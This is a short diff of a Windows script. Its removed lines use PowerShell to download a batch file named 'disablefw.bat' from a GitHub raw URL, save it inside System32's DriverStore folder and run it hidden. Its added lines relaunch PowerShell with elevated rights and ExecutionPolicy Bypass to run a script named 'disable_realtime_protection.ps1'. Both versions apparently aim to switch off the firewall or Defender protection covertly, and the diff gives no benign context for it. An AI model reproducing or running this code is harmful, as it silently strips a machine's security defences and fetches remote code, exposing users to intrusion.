@@ -1,3 +1,3 @@
-#
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/nguyenmanmkt/repo1/main/disablefw.bat" -OutFile "C:\Windows\System32\DriverStore\FileRepository\disablefw.bat"
-Start-Process -FilePath "C:\Windows\System32\DriverStore\FileRepository\disablefw.bat" -WindowStyle Hidden -NoNewWindow
+@echo off
+powershell -Command "Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""%~dp0disable_realtime_protection.ps1""' -Verb RunAs"
+
